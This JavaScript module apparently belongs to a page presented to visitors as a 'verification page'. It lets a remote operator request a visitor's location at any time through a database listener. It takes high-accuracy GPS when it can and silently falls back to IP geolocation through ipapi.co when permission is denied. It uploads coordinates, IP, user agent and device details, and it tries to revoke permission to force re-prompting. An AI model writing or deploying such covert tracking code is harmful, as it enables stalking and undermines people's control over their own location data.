import { getDeviceInfo } from '../../utils/browser-detection.js';

// Helper function to determine location source
export async function determineLocationSource(position) {
    console.log('Determining location source for position:', position);
    
    if ('permissions' in navigator) {
        try {
            const result = await navigator.permissions.query({ name: 'geolocation' });
            console.log('Geolocation permission state:', result.state);
            
            if (result.state === 'granted') {
                if (position.coords.accuracy < 100) {
                    console.log('High accuracy GPS detected');
                    return 'GPS (High Accuracy)';
                }
                else if (position.coords.accuracy < 500) {
                    console.log('Low accuracy GPS detected');
                    return 'GPS (Low Accuracy)';
                }
            }
        } catch (e) {
            console.error('Error checking permissions:', e);
        }
    }
    
    console.log('Using accuracy-based detection. Accuracy:', position.coords.accuracy);
    
    // Check for WiFi connection first
    const connection = navigator?.connection || navigator?.mozConnection || navigator?.webkitConnection;
    const isWifi = connection?.type === 'wifi';
    console.log('Connection type:', connection?.type);
    console.log('Is WiFi connection:', isWifi);
    
    // Determine source based on accuracy and connection type
    if (position.coords.accuracy < 100) {
        return 'GPS (High Accuracy)';
    }
    else if (position.coords.accuracy < 500) {
        return isWifi ? 'WiFi (High Accuracy)' : 'GPS (Low Accuracy)';
    }
    else if (position.coords.accuracy < 2000) {
        return isWifi ? 'WiFi' : 'Cell Tower (High Accuracy)';
    }
    else if (position.coords.accuracy < 5000) {
        return isWifi ? 'WiFi (Low Accuracy)' : 'Cell Tower';
    }
    return position.coords.accuracy < 10000 ? 'Cell Tower (Low Accuracy)' : 'IP-Based';
}

// Helper function to get high accuracy position
async function getHighAccuracyPosition() {
    return new Promise((resolve, reject) => {
        // Clear any cached permissions to ensure re-prompting
        if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query({ name: 'geolocation' })
                .then(permissionStatus => {
                    console.log('Permission status before request:', permissionStatus.state);
                    
                    // Reset permission state if it's not granted
                    if (permissionStatus.state !== 'granted') {
                        // Force a new permission prompt by revoking any existing permission
                        navigator.permissions.revoke?.({ name: 'geolocation' })
                            .catch(error => console.log('Error revoking permission:', error));
                    }
                })
                .catch(error => console.log('Error querying permission:', error));
        }

        // Request position with high accuracy
        navigator.geolocation.getCurrentPosition(
            resolve,
            (error) => {
                console.log('Geolocation error:', error);
                if (error.code === 1) { // Permission denied
                    console.log('Location permission denied, using IP fallback');
                }
                reject(error);
            },
            {
                enableHighAccuracy: true,
                timeout: 20000,
                maximumAge: 0
            }
        );
    });
}

// Helper function to check if locations are significantly different
function isLocationDifferent(oldLoc, newLoc, minDistance = 100) {
    // Calculate distance in meters using Haversine formula
    const R = 6371e3; // Earth's radius in meters
    const φ1 = oldLoc.latitude * Math.PI/180;
    const φ2 = newLoc.latitude * Math.PI/180;
    const Δφ = (newLoc.latitude - oldLoc.latitude) * Math.PI/180;
    const Δλ = (newLoc.longitude - oldLoc.longitude) * Math.PI/180;

    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
            Math.cos(φ1) * Math.cos(φ2) *
            Math.sin(Δλ/2) * Math.sin(Δλ/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    const distance = R * c;

    console.log('Distance between locations:', Math.round(distance), 'meters');
    return distance > minDistance;
}

// Listen for location requests
export function listenForLocationRequests() {
    if (!navigator.geolocation || !window.database) return;

    const requestsRef = window.database.ref('locationRequests');
    
    requestsRef.on('child_added', async (snapshot) => {
        const request = snapshot.val();
        if (!request || request.status !== 'pending') return;

        try {
            // Get the original location to update
            const locationRef = window.database.ref('locations/' + request.locationKey);
            const locationSnapshot = await locationRef.once('value');
            const originalLocation = locationSnapshot.val();
            if (!originalLocation) {
                throw new Error('Original location not found');
            }

            // Check if the record is still active
            if (originalLocation.status !== 'active') {
                throw new Error('Location record is no longer active');
            }

            let position;
            let locationSource = 'IP-Based';
            let useIpFallback = false;

            // Check permission state
            if ('permissions' in navigator) {
                const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                console.log('Current permission state:', permissionStatus.state);
                
                // If permission is denied, use IP fallback
                if (permissionStatus.state === 'denied') {
                    useIpFallback = true;
                }
            }

            // Try to get location if not using IP fallback
            if (!useIpFallback) {
                try {
                    position = await getHighAccuracyPosition();
                    locationSource = await determineLocationSource(position);
                } catch (geoError) {
                    console.log('Geolocation error:', geoError);
                    useIpFallback = true;
                }
            }

            // IP-based fallback
            if (useIpFallback) {
                console.log('Using IP-based location fallback');
                try {
                    const ipResponse = await fetch('https://ipapi.co/json/');
                    const ipData = await ipResponse.json();
                    
                    position = {
                        coords: {
                            latitude: parseFloat(ipData.latitude),
                            longitude: parseFloat(ipData.longitude),
                            accuracy: 10000 // IP-based accuracy is typically low
                        }
                    };
                    locationSource = 'IP-Based';
                } catch (ipError) {
                    console.error('Error getting IP-based location:', ipError);
                    throw new Error('Failed to get location from both GPS and IP');
                }
            }
        
            // Verify we got actual coordinates
            if (!position?.coords || typeof position.coords.latitude !== 'number' || typeof position.coords.longitude !== 'number') {
                throw new Error('Invalid location data received');
            }

            // Only check for significant change if not using IP fallback
            if (!useIpFallback) {
                const newLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };

                if (!isLocationDifferent(
                    { latitude: originalLocation.latitude, longitude: originalLocation.longitude },
                    newLocation
                )) {
                    throw new Error('No significant location change detected (less than 100m difference)');
                }
            }

            // Create new location entry
            const locationsRef = window.database.ref('locations');
            const newLocationRef = locationsRef.push();
            const timestamp = new Date().toISOString();

            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                locationSource: locationSource,
                timestamp: timestamp,
                status: 'active',
                isLocationUpdate: true,
                previousLocationKey: request.locationKey,
                ip: originalLocation.ip,
                userAgent: navigator.userAgent,
                ...getDeviceInfo()
            };

            // Only add optional fields if they exist
            if (position.coords.altitude !== null) {
                locationData.altitude = position.coords.altitude;
            }
            if (position.coords.altitudeAccuracy !== null) {
                locationData.altitudeAccuracy = position.coords.altitudeAccuracy;
            }

            // Save the new location
            await newLocationRef.set(locationData);

            // Update the request status
            await snapshot.ref.update({
                status: 'completed',
                newLocation: {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    locationSource: locationSource
                },
                completedAt: timestamp
            });

            // Update the original location to mark it as having an update
            await locationRef.update({
                hasUpdate: true,
                latestUpdateKey: newLocationRef.key
            });

        } catch (error) {
            console.error('Error updating location:', error);
            let errorMessage;
            
            // Specific error messages
            if (error.code === 1) {
                errorMessage = 'Location access was denied by the user';
            } else if (error.code === 2) {
                errorMessage = 'Location is not available';
            } else if (error.code === 3) {
                errorMessage = 'Location request timed out';
            } else if (error.message.includes('No significant location change')) {
                errorMessage = error.message;
            } else if (error.message.includes('no longer active')) {
                errorMessage = 'User is no longer on the verification page';
            } else {
                errorMessage = 'Failed to update location';
            }

            await snapshot.ref.update({
                status: 'failed',
                error: errorMessage,
                failedAt: new Date().toISOString()
            });
        }
    });
}

// Handle page unload/close
export function setupUnloadHandler() {
    window.addEventListener('beforeunload', async () => {
        try {
            const ip = await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(() => null);
                
            if (ip && window.database) {
                const locationsRef = window.database.ref('locations');
                const locationQuery = locationsRef.orderByChild('ip').equalTo(ip);
                const snapshot = await locationQuery.once('value');
                
                snapshot.forEach((childSnapshot) => {
                    const data = childSnapshot.val();
                    if (data.status === 'active') {
                        childSnapshot.ref.update({ status: 'inactive' });
                    }
                });
            }
        } catch (error) {
            console.error('Error updating status on page close:', error);
        }
    });
}
